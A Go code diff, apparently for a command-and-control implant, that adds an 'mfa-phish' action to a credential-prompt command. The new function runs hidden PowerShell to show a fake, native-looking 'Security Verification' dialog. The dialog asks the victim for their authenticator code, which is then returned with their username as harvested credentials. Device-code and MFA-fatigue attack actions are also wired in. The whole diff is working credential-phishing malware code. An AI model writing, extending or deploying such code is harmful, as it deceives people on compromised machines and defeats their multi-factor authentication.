@@ -5,6 +5,7 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
+	"os/exec"
 	"os/user"
 	"strings"
 	"syscall"
@@ -49,8 +50,12 @@ func (c *CredentialPromptCommand) Description() string {
 
 func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
 	// Check for cross-platform MFA actions before platform-specific dialog
-	if action := credPromptExtractAction(task.Params); action == "device-code" || action == "mfa-fatigue" {
+	action := credPromptExtractAction(task.Params)
+	if action == "device-code" || action == "mfa-fatigue" {
 		return credPromptDeviceCodeFlow(task)
+	}
+	if action == "mfa-phish" {
+		return credPromptMFAPhishWindows(task)
 	}
 
 	var args struct {
@@ -193,4 +198,53 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 		Completed:   true,
 		Credentials: &creds,
 	}
+}
+
+// credPromptMFAPhishWindows displays an MFA phishing dialog on Windows using
+// PowerShell with Windows Forms InputBox for a clean, native-looking dialog.
+func credPromptMFAPhishWindows(task structs.Task) structs.CommandResult {
+	var args struct {
+		Title   string `json:"title"`
+		Message string `json:"message"`
+	}
+	if task.Params != "" {
+		json.Unmarshal([]byte(task.Params), &args)
+	}
+
+	title := args.Title
+	if title == "" {
+		title = "Security Verification"
+	}
+	message := args.Message
+	if message == "" {
+		message = "Enter the verification code from your authenticator app."
+	}
+
+	// Use PowerShell with Microsoft.VisualBasic.Interaction.InputBox for a
+	// clean, native-looking dialog that asks for a text code (not a password).
+	psScript := fmt.Sprintf(
+		`Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('%s', '%s', '')`,
+		strings.ReplaceAll(message, "'", "''"),
+		strings.ReplaceAll(title, "'", "''"),
+	)
+
+	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psScript)
+	out, err := cmd.CombinedOutput()
+	defer structs.ZeroBytes(out)
+	if err != nil {
+		return errorf("MFA dialog failed: %v\n%s", err, strings.TrimSpace(string(out)))
+	}
+
+	code := strings.TrimSpace(string(out))
+
+	username := "unknown"
+	if u, err := user.Current(); err == nil {
+		username = u.Username
+	}
+
+	if code == "" {
+		return successResult("User cancelled the MFA dialog or submitted empty code")
+	}
+
+	return credPromptMFAPhishResult(code, title, username, "Windows")
 }
